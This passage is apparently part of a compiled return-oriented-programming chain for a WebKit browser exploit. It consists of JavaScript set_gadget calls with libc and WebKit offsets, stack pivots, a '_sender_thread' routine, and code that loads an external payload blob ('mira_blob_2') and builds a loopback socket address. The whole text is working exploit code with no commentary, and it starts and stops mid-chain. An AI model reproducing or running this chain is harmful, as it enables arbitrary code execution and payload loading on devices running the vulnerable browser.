libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+170192, //L2552
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+170208, //L2553
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2552:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2553:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+170368, //L2558
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+170320, //L2555
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170336, //L2556
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2555:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2556:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2557:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2558:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+170424, //L2559
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2559:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+170528, //L2561
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+170560, //L2563
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170544, //L2562
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2561:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2562:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2563:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+170720, //L2567
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170672, //L2564
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170688, //L2565
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2564:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2565:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2566:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2567:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+170824, //L2569
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170808, //L2568
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2568:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2569:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2570:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2571:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+171024, //L2574
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170992, //L2572
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2572:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2573:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2574:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+171128, //L2576
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+171112, //L2575
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2575:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+171240, //L2579
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+171208, //L2577
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2577:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2578:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2579:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+171304, //L2580
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L2580:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+171360, //L2582
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2582:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+171504, //L2585
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171520, //L2586
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+171488, //L2584
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2584:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2585:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2586:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+171680, //L2590
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+171632, //L2587
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+171648, //L2588
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2587:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2588:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2589:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2590:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+171808, //L2592
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171824, //L2593
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+171792, //L2591
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2591:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2592:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2593:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+171920, //L2594
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171936, //L2595
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2594:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2595:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172048, //L2596
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172032, //L2597
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2597:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+172136, //L2599
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+172120, //L2598
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2598:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2599:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172232, //L2600
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172248, //L2601
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2600:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2601:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172360, //L2602
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172344, //L2603
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2603:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2602:
db([0, 0]); // 0x0
//_sender_thread:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172432, //L2604
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2604:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172496, //L2606
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2606:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2608:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+792472, //pop rcx
//L2609:
(window.mira_blob_2||0),
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2612:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+792472, //pop rcx
//L2613:
(window.mira_blob_2_len||0),
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2614:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+172744, //L2616
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172760, //L2617
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2616:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2617:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+172920, //L2622
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+172872, //L2619
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172904, //L2621
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2619:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2620:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2621:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2622:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+173048, //L2624
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+173064, //L2625
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+173032, //L2623
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2623:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2624:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2625:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+173168, //L2627
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+173216, //L2630
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+173184, //L2628
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2627:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2628:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2629:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2630:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+173328, //L2631+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+173320, //L2631
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2631:
db([0, 0]); // 0x0
set_gadgets([
ropchain+173344, //L2631+24
ropchain+173648, //L2626
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+173416, //L2634
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2632:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2633:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2634:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+173512, //L2635
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+173528, //L2636
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2635:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2636:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+173640, //L2637
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+173624, //L2638
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2638:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2637:
db([0, 0]); // 0x0
//L2626:
set_gadget(libc_base+788575,); //pop rax
//L2639:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2641:
ropchain+220048, //L2640
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2643:
ropchain+173808, //L2642
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+187984, //L2644
//L2642:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+173896, //L2646
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2645:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2646:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2647:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2648:
db([2, 0]); // 0x2
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2650:
ropchain+174096, //L2649
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+185328, //L2651
//L2649:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+174184, //L2653
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2652:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+792472,); //pop rcx
//L2653:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L2656:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174288, //L2658
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2657:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2658:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L2660:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174384, //L2662
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2661:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2662:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174456, //L2664
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2663:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174528, //L2666
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2665:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2666:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174600, //L2668
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2667:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2668:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174672, //L2670
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2669:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2670:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174744, //L2672
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2671:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174816, //L2674
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2673:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2674:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174888, //L2676
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2675:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2676:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2677:
db([4294967265, 4294967295]); // -0x1f
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+174984, //L2680
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2679:
db([2, 0]); // 0x2
set_gadget(libc_base+788575,); //pop rax
//L2680:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2681:
db([4294967266, 4294967295]); // -0x1e
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+175072, //L2684
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2684:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2685:
db([15651, 0]); // 0x3d23
set_gadgets([
libc_base+562536, //mov [rdi], cx
libc_base+793877, //pop rsi
ropchain+175160, //L2687
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2686:
db([4294967268, 4294967295]); // -0x1c
set_gadget(libc_base+206806,); //pop rdi
//L2687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+175224, //L2690
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2689:
db([16777343, 0]); // 0x100007f
set_gadget(libc_base+788575,); //pop rax
//L2690:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+175272, //L2691
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2691:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2692:
db([16, 0]); // 0x10
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+175384, //L2694
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2693:
db([4294967264, 4294967295]); // -0x20
set_gadget(libc_base+788575,); //pop rax
//L2694:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+175488, //L2696
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2695:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+792472,); //pop rcx
//L2696:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+175576, //L2698
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175592, //L2699
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2698:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2699:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+175744, //L2702
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175776, //L2704
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+175728, //L2701
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175760, //L2703
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2701:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2702:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2704:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+175872, //L2706
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+175856, //L2705
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2705:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2706:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2708:
ropchain+175976, //L2707
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+184000, //L2709
//L2707:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2711:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2712:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+176128, //L2713
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176144, //L2714
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2713:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+176232, //L2716
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+176264, //L2718
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2716:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2717:
